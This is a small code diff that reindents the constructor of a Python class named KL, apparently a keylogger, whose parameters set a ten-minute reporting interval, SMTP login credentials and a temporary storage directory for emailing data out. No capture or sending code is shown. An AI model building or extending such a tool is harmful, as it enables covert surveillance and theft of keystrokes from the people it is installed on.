@@ -22,10 +22,11 @@ if os.name == 'nt':
 
 class KL(object):
 	def __init__(self,
-				interval = 600, # Default interval: 10 min
-				smtp_username = False,
-				smtp_password = False,
-				directory = tempfile.gettempdir()):
+		interval = 600, # Default interval: 10 min
+		smtp_username = False,
+		smtp_password = False,
+		directory = tempfile.gettempdir()):
+		
 		super(KL, self).__init__()
 		self.login_data = {
 			'email': smtp_username,
